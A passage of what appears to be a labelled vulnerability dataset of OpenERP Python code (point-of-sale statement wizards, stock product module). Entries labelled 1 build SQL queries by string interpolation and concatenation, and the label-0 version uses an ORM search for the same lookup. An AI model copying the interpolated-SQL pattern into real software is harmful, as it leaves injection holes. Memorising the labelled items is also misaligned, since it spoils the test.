self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n/addons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 1}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/naddons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 0}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "/addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n/addons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 1}, {"id": "1521b235409982842b63b423c6ff7ac4ed4ca1db", "code": "addons/stock/product.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date = context.get('from_date',False)\n        to_date = context.get('to_date',False)\n        date_str = False\n        date_values = False\n        if from_date and to_date:\n            date_str = \"date_planned>=%s and date_planned<=%s\"\n            date_values = [from_date, to_date]\n        elif from_date:\n            date_str = \"date_planned>=%s\"\n            date_values = [from_date] \n        elif to_date:\n            date_str = \"date_planned<=%s\"\n            date_values = [to_date]\n\n        where = [tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states)]\n        if date_values:\n            where.append(tuple(date_values))\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',tuple(where))\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom 